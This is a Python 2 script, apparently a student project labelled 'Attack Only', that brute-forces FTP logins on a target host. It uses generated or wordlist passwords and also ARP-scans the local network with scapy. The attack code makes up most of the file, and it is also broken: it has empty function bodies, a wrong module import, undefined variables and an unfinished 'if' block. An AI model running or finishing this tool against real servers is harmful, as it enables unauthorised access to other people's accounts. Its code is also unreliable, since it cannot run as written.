#!/usr/bin/env python2
#-*- coding:utf-8 -*-

from __future__ import absolute_import, division, print_function
import logging
import scapy.config
import scapy.layers.l2
import scapy.route
import math
import errno
import socket
import sys,os
import ftplib
import argparse
import threading
import subprocess
from random import randint
from multiprocessing import Pool
from strings import digits,ascii_lowercase

known_ports = [21,22,25,53,80,443]
big = ascii_lowercase + digits
pwd = []

logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.DEBUG)
logger = logging.getLogger(__name__)

def pwd_lower(lgr):
	return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))


def pwd_dig(lgr):
	return ''.join(digits[randint(0,len(digits)-1)] for i in range(int(lgr)))


def pwd_big(lgr):
	return ''.join(big[randint(0,len(big)-1)] for i in range(int(lgr)))


def generate(mode,lgr):
	try:
		while len(pwd) != 100000:
			if mode == 'alpha': 	psswd = pwd_lower(lgr)
			elif mode == 'digits':	psswd = pwd_dig(lgr)
			else:			psswd = pwd_big(lgr)
			if psswd not in pwd:	pwd.append(psswd)
			if len(pwd) == 100000: sys.stdout.write('\n\033[94m[+]\033[0m Dictionnaire généré.\n')
	except KeyboardInterrupt:
		sys.stdout.write('\n\033[94m[+]\033[0m Génération interrompue avec succès. Longueur : %d.\n' % len(pwd))
		pass
	return pwd


def detonate(log,addr,psswd):
	prout = ftplib.FTP(addr)
	try:
		ret = prout.login(user=log,passwd=psswd)
		prout.quit()
		if "successful" in ret:
			sys.stdout.write('\n\n\n\033[94m[+]\033[0m YEAH : ' + psswd + '\n\n')
			sys.exit(0)
	except:
		sys.stdout.write('\r\033[92m[-]\033[0m Test : ' + psswd)
		sys.stdout.flush()
		prout.close()


def long2net(arg):
	if (arg <= 0 or arg >= 0xFFFFFFFF):
		raise ValueError("Valeur du masque illégale.", hex(arg))
	return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))


def to_CIDR_notation(bytes_network, bytes_netmask):
	network = scapy.utils.ltoa(bytes_network)
	netmask = long2net(bytes_netmask)
	net = "%s/%s" % (network, netmask)
	if netmask < 16:
		logger.warn("%s est trop gros." % net)
		return None

	return net


def scan_and_print_neighbors(net, interface, timeout=1):
	logger.info("ARP %s sur %s" % (net, interface))
	try:
		ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=True)
		for s, r in ans.res:
			line = r.sprintf("%Ether.src%  %ARP.psrc%")
			try:
				hostname = socket.gethostbyaddr(r.psrc)
				line += " " + hostname[0]
			except socket.herror:
				# Pas de résolution
				pass
			logger.info(line)
	except socket.error as e:
		if e.errno == errno.EPERM:     # "Opération non permise"
			logger.error("%s. Vous n'etes pas root?", e.strerror)
		else:
			raise


def local_network_scan():
	for network, netmask, _, interface, address in scapy.config.conf.route.routes:
		# On ne regarde pas la loopback
		if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
			continue
		if netmask <= 0 or netmask == 0xFFFFFFFF:
			continue
		net = to_CIDR_notation(network, netmask)
		if interface != scapy.config.conf.iface:
			#see http://trac.secdev.org/scapy/ticket/537
			logger.warn("skipping %s because scapy currently doesn't support arping on non-primary network interfaces", net)
			continue
		if net:
			scan_and_print_neighbors(net, interface)
#___________________________________


def network_scan(ip,mask):
	mask = [255,255,255,0]
	pre = [str(int(ip[i]) & int(mask[i])) for i in range(len(ip.split('.')))]
	ip_reseau = pre[0] + '.' + pre[1] + '.' + pre [2] + '.' + pre[3]
	all_hosts = 

	for ips in range(len(all_hosts)):

	return available_ips


def port_scan(ip):
	
	return ports


def get_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8",80))
	ret = s.getsockname()[0]
	s.close()
	return ret


def get_args():
	args = argparse.ArgumentParser(version='1.0',description='Attack Only, made by ESGI.')
	args.add_argument('-a','--all',
		action='store_true',
		default=False,
		help='Scan et attaque.')
	args.add_argument('-i','--ip',
		action='store',
		default=get_ip(),
		nargs=1,
		help='Machine cible.')
	args.add_argument('-w','--wordlist',
		action='store',
		nargs=1,
		help='Bruteforce par dictionnaire.')
	args.add_argument('-u','--username',
		action='store',
		nargs=1,
		default='admin',
		help='Username distant à BF.')
	args.add_argument('-m','--mode',
		action='store',
		nargs=1,
		help='Alphabet de bruteforce [alpha|digits|big].')
	args.add_argument('-l','--longueur',
		action='store',
		nargs=1,
		default='3',
		help='Longueur souhaitée.')

	return args.parse_args()


if __name__ == '__main__':

	args = get_args()
	pool = Pool(4)
	user = args.username[0]
	ip = args.ip[0]
	ips = network_scan(ip)

	if args.wordlist is not None:
		try:
			print "\033[94m[+]\033[0m Prise en compte de la wordlist:", args.wordlist[0]
			with open(args.worlist[0],'r') as wl:
				dic = wl.readlines()
		except:
			print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
			sys.exit(-1)
	elif args.mode is not None:
		print "[*] Mode:",args.mode[0]
		print "[*] IP:",ip
		print "\033[94m[+]\033[0m Generation du dictionnaire (100.000 elements max)."
		print "[*] Longueur des lignes:",args.longueur[0]
		print "[*] Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
		dic = generate(args.mode[0],args.longueur[0])

		try:
			for item in dic:
				t = threading.Thread(target=detonate,args=(args.username[0],args.ip[0],item,))
				t.start()
				t.join()
				idx += 1
		except KeyboardInterrupt:
			print '\n\n[*] Nbr d\'essais '+ str(idx)
	else:
		print '\033[91m[-]\033[0m Vous devez mentionner un mode (wordlist / mode de bf).'
		sys.exit(1)

	if ip == get_ip():
		local_network_scan()

	if args.all:

#	with open(args.wordlist,'r') as dict_file:
#		pool.map(process_line,dict_file,4)
